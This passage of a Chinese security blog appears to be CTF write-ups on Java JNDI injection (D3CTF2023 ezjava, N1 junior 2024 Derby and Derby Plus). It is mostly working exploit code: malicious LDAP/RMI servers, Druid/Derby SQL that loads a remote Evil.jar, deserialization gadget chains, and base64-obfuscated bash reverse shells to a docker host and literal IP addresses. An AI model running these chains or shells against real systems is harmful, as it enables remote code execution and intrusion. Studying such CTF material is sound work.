class="hljs-operator">=</span> result.getRequest().getBaseDN();            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);            <span class="hljs-keyword">try</span> &#123;                sendResult(result,base,e);            &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;                ex.printStackTrace();            &#125;        &#125;        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="hljs-keyword">throws</span> Exception &#123;            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>);            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&quot;#&quot;</span>);            <span class="hljs-keyword">if</span> (refPos &gt; <span class="hljs-number">0</span>)&#123;                cbstring = cbstring.substring(<span class="hljs-number">0</span>,refPos);            &#125;<span class="hljs-comment">//            利用 LDAP + Reference</span><span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span><span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><span class="hljs-comment">//             Payload2: 返回序列化 Gadget</span>            <span class="hljs-keyword">try</span> &#123;                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyA。。。。。。。&quot;</span>));            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;                exception.printStackTrace();            &#125;            result.sendSearchEntry(e);            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));        &#125;    &#125;&#125;</code></pre></div><h2 id="D3CTF2023-ezjava"><a href="#D3CTF2023-ezjava" class="headerlink" title="D3CTF2023  ezjava"></a>D3CTF2023  ezjava</h2><p>这里不是jndi注入，就是出现了使用BeanFactory和ELProcessor</p><p>为什么能使用呢，因为ContinuationDirContext的父类ContinuationContext的getTargetContext()能够进行reference注入</p><p>然后就使用这个去绕过一下高版本</p><p>payload网上很多</p><h2 id="N1-junior-2024"><a href="#N1-junior-2024" class="headerlink" title="N1 junior 2024"></a>N1 junior 2024</h2><h3 id="Derby"><a href="#Derby" class="headerlink" title="Derby"></a>Derby</h3><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425223635957.png" alt="image-20240425223635957"></p><p>只有一个jndi注入的路由</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425223709621.png" alt="image-20240425223709621"></p><p>唯二的依赖，druid连接池和derby数据库</p><p>并且还是jdk17的高版本</p><p>在Tomcat某些版本是可以BeanFactory配合EL去实现命令执行的，这里是Druid，也可以绕过，<code>DruidDataSourceFactory#getObjectInstance</code></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225128216.png" alt="image-20240425225128216"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225141604.png" alt="image-20240425225141604"></p><p>DruidDataSourceFactory有个initConnectionSqls能够执行sql语句</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225225287.png" alt="image-20240425225225287"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225512597.png" alt="image-20240425225512597"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225638704.png" alt="image-20240425225638704"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225736707.png" alt="image-20240425225736707"></p><p>至此druid就发起了jdbc连接</p><p>然后就要考虑数据库进行RCE</p><p>上面一处提到经由DruidDataSourceFactory能够执行sql语句</p><p>但这里不是H2</p><p>经过搜索文章发现derby也可以通过sql语句加载jar包进行RCE（我找不到呜呜</p><p><a href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">derby数据库如何实现RCE - lvyyevd’s 安全博客</a></p><p>关于这个DruidDataSourceFactory的reference注入，放在RMI或是LDAP服务端都可以</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<span class="hljs-keyword">import</span> javax.naming.Reference;<span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<span class="hljs-keyword">import</span> java.rmi.registry.Registry;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DerbyEvilServer</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;        <span class="hljs-keyword">try</span>&#123;            Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);            Reference ref = <span class="hljs-keyword">new</span> <span class="hljs-type">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,<span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="hljs-literal">null</span>);            <span class="hljs-keyword">String</span> JDBC_URL = <span class="hljs-string">&quot;jdbc:derby:dbname;create=true&quot;</span>;            <span class="hljs-keyword">String</span> JDBC_USER = <span class="hljs-string">&quot;root&quot;</span>;            <span class="hljs-keyword">String</span> JDBC_PASSWORD = <span class="hljs-string">&quot;password&quot;</span>;            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>));            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,JDBC_USER));            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,JDBC_PASSWORD));            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;initConnectionSqls&quot;</span>,<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://host.docker.internal:8000/Evil.jar&#x27;, &#x27;APP.Sample4&#x27;, 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Sample4&#x27;);CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;testShell4.exec&#x27;;CALL SALES.TOTAL_REVENUES();&quot;</span>));            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>));            ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> <span class="hljs-type">ReferenceWrapper</span>(ref);            registry.bind(<span class="hljs-string">&quot;pop&quot;</span>,referenceWrapper);        &#125;        <span class="hljs-keyword">catch</span>(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<span class="hljs-keyword">import</span> javax.naming.Reference;<span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<span class="hljs-keyword">import</span> javax.net.SocketFactory;<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<span class="hljs-keyword">import</span> java.net.InetAddress;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(                    <span class="hljs-string">&quot;listen&quot;</span>,                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>());            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);            ds.startListening();        &#125;        <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;        <span class="hljs-meta">@Override</span>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);            <span class="hljs-keyword">try</span> &#123;                List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();                list.add(<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://host.docker.internal:8000/Evil.jar&#x27;, &#x27;APP.Evil&#x27;, 0)&quot;</span>);                list.add(<span class="hljs-string">&quot;CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Evil&#x27;)&quot;</span>);                list.add(<span class="hljs-string">&quot;CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;Evil.exec&#x27;&quot;</span>);                list.add(<span class="hljs-string">&quot;CALL cmd(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>);                <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>, <span class="hljs-literal">null</span>);                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;jdbc:derby:webdb;create=true&quot;</span>));                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>));                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>));                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initConnectionSqls&quot;</span>, String.join(<span class="hljs-string">&quot;;&quot;</span>, list)));                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, SerializeUtil.serialize(ref));                result.sendSearchEntry(e);                result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));            &#125; <span class="hljs-keyword">catch</span> (Exception exception) &#123;                exception.printStackTrace();            &#125;        &#125;    &#125;&#125;</code></pre></div><p>看你要执行的sql语句写对应jar包，要是是上面RMI执行空参函数，那就直接写命令</p><p>像LDAP能传入String参数那就写个能传参的sql语句</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;        Runtime.getRuntime().exec(cmd);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testShell4</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;        Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NSA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">javac src/Evil.javajar -cvf Evil.jar -C src/ .</code></pre></div><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233615123.png" alt="image-20240425233615123"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233630623.png" alt="image-20240425233630623"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233650022.png" alt="image-20240425233650022"></p><p>是RMI的话由于对象和名称进行了绑定，所以要访问pop，差点忘了</p><p>是LDAP的话，由于此处不需要加载class文件，所以任意名称即可</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233841470.png" alt="image-20240425233841470"></p><h3 id="Derby-Plus"><a href="#Derby-Plus" class="headerlink" title="Derby Plus"></a>Derby Plus</h3><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425234310876.png" alt="image-20240425234310876"></p><p>并且多给了个cb的依赖</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425234717659.png" alt="image-20240425234717659"></p><h4 id="X1r0z-出题人-思路"><a href="#X1r0z-出题人-思路" class="headerlink" title="X1r0z(出题人)思路"></a>X1r0z(出题人)思路</h4><p>出题人的思路很有意思，现在没给jndi的注入点了，那就从原生反序列化到jndi注入</p><p>那需要的就是LdapAttribute利用链</p><p>用到的是LDAP服务端</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<span class="hljs-keyword">import</span> javax.naming.CompositeName;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.PriorityQueue;<span class="hljs-keyword">import</span> java.util.Queue;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cb</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<span class="hljs-comment">//        String ldapCtxUrl = &quot;ldap://host.docker.internal:1389/&quot;;</span><span class="hljs-comment">//        Class ldapAttributeClazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);</span><span class="hljs-comment">//        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[] &#123;String.class&#125;);</span><span class="hljs-comment">//        ldapAttributeClazzConstructor.setAccessible(true);</span><span class="hljs-comment">//        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[] &#123;&quot;name&quot;&#125;);</span><span class="hljs-comment">//        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(&quot;baseCtxURL&quot;);</span><span class="hljs-comment">//        baseCtxUrlField.setAccessible(true);</span><span class="hljs-comment">//        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);</span><span class="hljs-comment">//        Field rdnField = ldapAttributeClazz.getDeclaredField(&quot;rdn&quot;);</span><span class="hljs-comment">//        rdnField.setAccessible(true);</span><span class="hljs-comment">//        rdnField.set(ldapAttribute, new CompositeName(&quot;a//b&quot;));</span><span class="hljs-comment">//</span><span class="hljs-comment">//        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</span><span class="hljs-comment">//        Queue queue = new PriorityQueue(2, comparator);</span><span class="hljs-comment">//        queue.add(&quot;1&quot;);</span><span class="hljs-comment">//        queue.add(&quot;1&quot;);</span><span class="hljs-comment">//        setFieldValue(comparator, &quot;property&quot;, &quot;attributeDefinition&quot;);</span><span class="hljs-comment">//        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;ldapAttribute, ldapAttribute&#125;);</span>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(String.class);        constructor.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;name&quot;</span>);        setFieldValue(obj, <span class="hljs-string">&quot;baseCtxURL&quot;</span>, <span class="hljs-string">&quot;ldap://host.docker.internal:1389/&quot;</span>);<span class="hljs-comment">//        setFieldValue(obj, &quot;baseCtxURL&quot;, &quot;ldap://127.0.0.1:1389/&quot;);</span>        setFieldValue(obj, <span class="hljs-string">&quot;rdn&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeName</span>(<span class="hljs-string">&quot;a/b&quot;</span>));        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);        beanComparator.setProperty(<span class="hljs-string">&quot;attributeDefinition&quot;</span>);        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);        oos.writeObject(priorityQueue);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(barr.toByteArray());        System.out.println(a);<span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><span class="hljs-comment">//        inputStream.readObject();</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(<span class="hljs-literal">true</span>);        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        <span class="hljs-keyword">return</span> field;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);        field.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-keyword">if</span>(field != <span class="hljs-literal">null</span>) &#123;            field.set(obj, value);        &#125;    &#125;&#125;</code></pre></div><p>由于之前用过这个链子，导致我认为他肯定会请求a.class文件</p><p>但其实高版本的jndi就不是请求文件了，而是像上面说的绕过方法，ldap就是反序列化数据</p><p>这一点困了有点时间</p><h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>有点疑惑就是jdk1.8_202和jdk17生成的payload是一样的</p><p>然后burp在打的时候，base64数据是不用进行url编码的，编码会使解密报错</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426183357206.png" alt="image-20240426183357206"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426175513823.png" alt="image-20240426175513823"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426174344175.png" alt="image-20240426174344175"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426174319155.png" alt="image-20240426174319155"></p><h4 id="Boogipop思路"><a href="#Boogipop思路" class="headerlink" title="Boogipop思路"></a>Boogipop思路</h4><p>这位哥真的是炉火纯青啊，getter + jdbc</p><blockquote><p>已经是赤裸裸的在勾引了。打一个getter去触发getconnection，所以都不需要思考就找到了<br><code>DruidDataSource#getConnection</code></p></blockquote><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426184341670.png" alt="image-20240426184341670"></p><p>这里也有init</p><p>其实上面init之后的流程为什么能jdbc我也不了解。。。。</p><p>知道就行，然后就能打了</p><div class="code-wrapper"><pre><code class="hljs reasonml">import com.alibaba.druid.pool.DruidDataSource;import org.apache.commons.beanutils.BeanComparator;import javax.naming.CompositeName;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.Collections;import java.util.PriorityQueue;import java.util.StringTokenizer;public <span class="hljs-keyword">class</span> Druid_getter &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        DruidDataSource druidDataSource = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DruidDataSource()</span>;        druidDataSource.set<span class="hljs-constructor">Url(<span class="hljs-string">&quot;jdbc:derby:dbname;create=true&quot;</span>)</span>;        druidDataSource.set<span class="hljs-constructor">DriverClassName(<span class="hljs-string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>)</span>;        druidDataSource.set<span class="hljs-constructor">InitialSize(1)</span>;        StringTokenizer tokenizer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">StringTokenizer(<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://host.docker.internal:8000/Evil.jar&#x27;, &#x27;APP.Sample4&#x27;, 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Sample4&#x27;);CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;Evil.exec&#x27;;CALL cmd(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguODkuNjEuNzEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>)</span>;        druidDataSource.set<span class="hljs-constructor">ConnectionInitSqls(Collections.<span class="hljs-params">list</span>(<span class="hljs-params">tokenizer</span>)</span>);        BeanComparator beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BeanComparator(<span class="hljs-params">null</span>, String.CASE_INSENSITIVE_ORDER)</span>;        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">PriorityQueue(2, <span class="hljs-params">beanComparator</span>)</span>;        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);        beanComparator.set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;connection&quot;</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;logWriter&quot;</span>,<span class="hljs-params">null</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;statLogger&quot;</span>,<span class="hljs-params">null</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;transactionHistogram&quot;</span>,<span class="hljs-params">null</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;initedLatch&quot;</span>,<span class="hljs-params">null</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">priorityQueue</span>, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">druidDataSource</span>, <span class="hljs-params">druidDataSource</span>&#125;)</span>;        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">priorityQueue</span>)</span>;        oos.close<span class="hljs-literal">()</span>;        String a = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);        <span class="hljs-module-access"><span 